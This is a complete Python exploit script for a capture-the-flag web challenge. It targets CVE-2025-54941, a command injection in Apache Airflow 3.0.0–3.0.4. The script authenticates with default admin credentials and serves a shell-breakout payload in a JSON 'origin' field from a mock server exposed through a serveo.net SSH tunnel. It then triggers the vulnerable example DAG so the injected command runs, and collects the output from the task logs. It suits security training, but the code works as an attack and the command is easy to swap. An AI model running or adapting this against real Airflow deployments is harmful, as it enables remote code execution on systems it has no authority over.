#!/usr/bin/env python3
"""
Challenge: nday1
Category:  web
Platform:  UNbreakable 2026
CVE:       CVE-2025-54941 (Apache Airflow 3.0.0-3.0.4 OS Command Injection)
"""
import requests
import json
import sys
import time
import subprocess
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# === CONFIGURATION ===
LOCAL_URL = "http://localhost:8080"
REMOTE_URL = "http://35.198.121.234:30726"
BASE = REMOTE_URL if "--remote" in sys.argv else LOCAL_URL

CREDS = {"username": "admin", "password": "admin"}
MOCK_PORT = 9999
# Command to inject via the BashOperator
CMD = "cat /flag*"

session = requests.Session()

# === MOCK SERVER ===
# Returns JSON with command injection in the "origin" field.
# The vulnerable DAG interpolates origin directly into:
#   f"echo 'Seems like...IP {external_ip}'"
# Our payload breaks out of the single quotes and executes CMD.

class MockHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        payload = json.dumps({"origin": f"'; {CMD} ; echo '"})
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(payload.encode())
    def log_message(self, format, *args):
        pass

def start_mock_server():
    server = HTTPServer(("0.0.0.0", MOCK_PORT), MockHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server

# === HELPERS ===

def get_token():
    r = session.post(f"{BASE}/auth/token", json=CREDS)
    r.raise_for_status()
    token = r.json()["access_token"]
    session.headers["Authorization"] = f"Bearer {token}"
    print(f"[+] JWT token obtained")
    return token

def get_version():
    r = session.get(f"{BASE}/api/v2/version")
    v = r.json()
    print(f"[*] Airflow version: {v['version']} (git: {v.get('git_version','')})")
    return v['version']

def trigger_dag(dag_id, conf, logical_date=None):
    if not logical_date:
        # Use a past date so run_after is in the past and scheduler picks it up immediately
        logical_date = "2026-03-01T00:00:00Z"
    payload = {"logical_date": logical_date, "conf": conf}
    r = session.post(f"{BASE}/api/v2/dags/{dag_id}/dagRuns", json=payload)
    r.raise_for_status()
    data = r.json()
    run_id = data["dag_run_id"]
    print(f"[+] Triggered {dag_id} run_id={run_id} state={data['state']}")
    return run_id

def wait_for_run(dag_id, run_id, timeout=120):
    print(f"[*] Waiting for DAG run to complete (timeout={timeout}s)...")
    start = time.time()
    while time.time() - start < timeout:
        r = session.get(f"{BASE}/api/v2/dags/{dag_id}/dagRuns/{run_id}")
        state = r.json()["state"]
        if state in ("success", "failed"):
            print(f"[*] DAG run finished: state={state}")
            return state
        time.sleep(3)
    print(f"[-] Timeout waiting for DAG run")
    return "timeout"

def get_task_logs(dag_id, run_id, task_id, try_number=1):
    r = session.get(
        f"{BASE}/api/v2/dags/{dag_id}/dagRuns/{run_id}/taskInstances/{task_id}/logs/{try_number}",
        headers={"Accept": "application/json"}
    )
    r.raise_for_status()
    events = r.json().get("content", [])
    lines = []
    for e in events:
        if isinstance(e, dict) and "event" in e:
            lines.append(e["event"])
    return lines

# === EXPLOIT ===

def exploit():
    print("=" * 60)
    print("CVE-2025-54941 — Apache Airflow example_dag_decorator RCE")
    print("=" * 60)

    # Step 1: Authenticate
    get_token()
    version = get_version()

    # Step 2: Start mock server & expose via tunnel
    # The mock server returns {"origin": "'; <CMD> ; echo '"}
    # which gets injected into a BashOperator command unsanitized.
    print(f"\n[*] Starting mock HTTP server on port {MOCK_PORT}...")
    start_mock_server()

    # Expose via serveo.net SSH tunnel
    print(f"[*] Starting serveo.net tunnel...")
    proc = subprocess.Popen(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60",
         "-R", f"80:localhost:{MOCK_PORT}", "serveo.net"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

    tunnel_url = None
    for line in iter(proc.stdout.readline, ''):
        if "Forwarding" in line and "http" in line:
            # Extract URL from: "Forwarding HTTP traffic from https://xxx.serveousercontent.com"
            parts = line.strip().split()
            for part in parts:
                if part.startswith("http"):
                    tunnel_url = part.rstrip()
                    break
            break

    if not tunnel_url:
        print("[-] Failed to establish tunnel. Set TUNNEL_URL env var manually.")
        proc.kill()
        sys.exit(1)

    print(f"[+] Tunnel established: {tunnel_url}")

    # Verify tunnel
    try:
        r = requests.get(tunnel_url, timeout=10, verify=False)
        origin = r.json().get("origin", "")
        print(f"[+] Tunnel verified, mock returns origin='{origin[:40]}...'")
    except Exception as e:
        print(f"[-] Tunnel verification failed: {e}")
        proc.kill()
        sys.exit(1)

    # Step 3: Trigger the vulnerable DAG with our URL
    dag_id = "example_dag_decorator"
    print(f"\n[*] Triggering {dag_id} with malicious URL...")
    conf = {"url": f"{tunnel_url}/"}
    run_id = trigger_dag(dag_id, conf)

    # Step 4: Wait for execution
    state = wait_for_run(dag_id, run_id)

    # Step 5: Extract flag from logs
    print(f"\n[*] Fetching task logs...")
    logs = get_task_logs(dag_id, run_id, "echo_ip_info")

    print("\n" + "=" * 60)
    print("Task output:")
    print("=" * 60)
    for line in logs:
        print(f"  {line}")
        if "CTF{" in line or "flag{" in line.lower():
            print(f"\n[+] FLAG FOUND: {line.strip()}")

    # Cleanup
    proc.kill()

if __name__ == "__main__":
    exploit()
